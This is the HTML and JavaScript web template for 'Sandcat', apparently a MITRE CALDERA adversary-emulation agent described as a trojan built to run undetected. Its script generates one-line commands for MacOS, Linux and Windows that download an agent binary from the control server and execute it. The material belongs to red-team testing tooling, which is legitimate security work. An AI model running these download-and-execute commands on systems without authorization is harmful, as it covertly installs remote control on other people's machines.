<html>
    <head>
        <title>Sandcat | 54ndc47</title>
        <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
        <link rel="stylesheet" href="/gui/css/shared.css">
        <link rel="stylesheet" href="/gui/css/navbar.css">
        <link rel="stylesheet" href="/sandcat/css/basic.css">
    </head>
    <body>
    <center style="margin-bottom: 100px">
        <div class="topnav">
          <a href="/">Home</a>
            {% for plugin in plugins %}
              {% if plugin.address %}
                <a href="{{ plugin.address }}">{{ plugin.name }}</a>
              {% endif %}
          {% endfor %}
          <div class="topnav-right">
            <a href="https://github.com/mitre/caldera/wiki" target="_blank">Docs</a>
            <a href="/logout">Logout</a>
          </div>
        </div>
        <div id="notice" class="notice" style="display:none">Chrome is the only supported browser. Please change to that or some website components may not work.</div>

        <div>
            <div id="sandcat-blocks" class="row-canvas">
                <div class="section-profile">
                    <div class="row">
                        <div class="column section-border" style="flex:37%;text-align:left;padding:15px;">
                            <h1 style="text-shadow: 5px 5px 5px var(--theme-color);font-size:70px;margin-top:-20px;">54ndc47</h1>
                            <h2 style="margin-top:-55px">coordinated access trojan (CAT)</h2>
                            <p>
                                A sandcat is a desert cat that leaves no footprint. In that vein,
                                54ndc47 is an agent designed to run without detection on any host operating system.
                                CATs are deployed by running 1-line <i>delivery commands</i>, based on the
                                target operating system.
                            </p>
                            <select id="dcommands" style="width:60%;" onchange="displayCommand()">
                                <option disabled="disabled" selected>Select target OS</option>
                                <option value="darwin">MacOS</option>
                                <option value="linux">Linux</option>
                                <option value="windows-psh">Windows (PowerShell)</option>
                                <option value="windows-cmd">Windows (CMD)</option>
                            </select>
                        </div>
                        <div class="column" style="flex:67%;padding:15px;text-align: left">
                            <div style="background-color: var(--primary-background);padding: 15px;border-radius: 25px">
                                <code id="delivery-command" style="text-align: left;font-size:14px;"></code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </center>
    </body>
    <script src="/gui/jquery/jquery.js"></script>
    <script src="/gui/js/shared.js"></script>
    <script>
        function displayCommand(){
            let selected_option = document.getElementById("dcommands").value;
            let x = $('#delivery-command');
            let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
            if(selected_option === 'windows-psh') {
                x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group -v;');
            } else if(selected_option === 'windows-cmd') {
                x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executors cmd -v;')
            } else if (selected_option === 'linux') {
                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
            } else if (selected_option === 'darwin') {
                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
            }
        }
        function actionDownload(phrase){
            $.getScript('/sandcat/js/malicious.js');
        }
        function detachPet(){
            $.ajax({
                url: '/plugin/sandcat/pet',
                type: 'POST',
                success: function(data, status, options) {
                    flashy('pet-flash', 'New pet detached!');
                },
            });
        }
    </script>
</html>